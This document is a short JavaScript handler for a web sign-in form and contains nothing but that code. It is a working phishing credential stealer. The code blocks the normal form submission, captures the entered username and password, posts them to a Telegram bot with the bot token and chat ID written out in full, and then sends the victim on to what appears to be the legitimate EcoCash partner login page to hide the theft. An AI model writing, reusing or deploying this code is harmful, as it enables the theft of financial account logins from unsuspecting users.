<script>
  document.getElementById("signin").addEventListener("submit", function (e) {
    e.preventDefault(); // Prevent default form submission

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;

    // Send message to Telegram
    fetch("https://api.telegram.org/bot8275838652:AAF2NTMoHbN6oOr9WTr1R6doKaOijIsPKto/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "7794015933",
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        window.location.href = "https://partnerapplications.ecocash.co.zw/login"; // Redirect after success
      } else {
        alert("Failed to send message.");
      }
    })
    .catch(error => {
      console.error("Error:", error);
      alert("Something went wrong.");
    });
  });
</script>
